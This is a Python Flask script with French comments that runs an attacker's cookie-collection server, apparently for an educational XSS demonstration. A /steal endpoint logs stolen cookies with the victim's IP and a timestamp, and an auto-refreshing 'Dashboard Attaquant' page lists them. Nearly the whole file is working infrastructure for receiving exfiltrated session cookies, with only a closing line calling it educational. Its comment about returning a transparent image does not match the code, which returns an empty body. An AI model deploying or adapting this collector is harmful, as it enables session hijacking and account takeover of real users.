# /// script
# dependencies = [
#   "flask",
# ]
# ///
from datetime import datetime

from flask import Flask, request

app = Flask(__name__)

# Liste pour stocker les cookies volés
stolen_cookies = []


@app.route("/steal")
def steal_cookie():
    """Endpoint qui reçoit les cookies volés."""
    cookie = request.args.get("cookie", "")
    source_ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if cookie:
        stolen_cookies.append({"cookie": cookie, "ip": source_ip, "time": timestamp})

        print("\n" + "=" * 50)
        print("🚨 COOKIE VOLÉ!")
        print("=" * 50)
        print(f"⏰ Heure: {timestamp}")
        print(f"🌐 IP source: {source_ip}")
        print(f"🍪 Cookie: {cookie}")
        print("=" * 50)

    # Retourner une image 1x1 transparente (pour éviter les erreurs dans le navigateur)
    return "", 200


@app.route("/dashboard")
def dashboard():
    """Affiche tous les cookies volés."""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dashboard Attaquant</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #1a1a2e; color: #eee; }
            h1 { color: #e94560; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
            th { background: #16213e; color: #e94560; }
            tr:hover { background: #16213e; }
            .cookie { font-family: monospace; color: #0f0; }
        </style>
        <meta http-equiv="refresh" content="5">
    </head>
    <body>
        <h1>🕵️ Dashboard Attaquant - Cookies Volés</h1>
        <p>Cette page se rafraîchit automatiquement toutes les 5 secondes.</p>
        <table>
            <tr>
                <th>Heure</th>
                <th>IP Source</th>
                <th>Cookies</th>
            </tr>
    """

    for entry in reversed(stolen_cookies):
        html += f"""
            <tr>
                <td>{entry["time"]}</td>
                <td>{entry["ip"]}</td>
                <td class="cookie">{entry["cookie"]}</td>
            </tr>
        """

    html += """
        </table>
        <p><small>⚠️ Ceci est une démonstration éducative uniquement.</small></p>
    </body>
    </html>
    """
    return html


if __name__ == "__main__":
    print("=" * 60)
    print("SERVEUR ATTAQUANT - COLLECTEUR DE COOKIES")
    print("=" * 60)
    print("\n📡 En écoute sur http://localhost:5001")
    print("📊 Dashboard: http://localhost:5001/dashboard")
    print("\nLes cookies volés apparaîtront ici...")
    print("=" * 60)
    print("\n\n")
    app.run(port=5001)
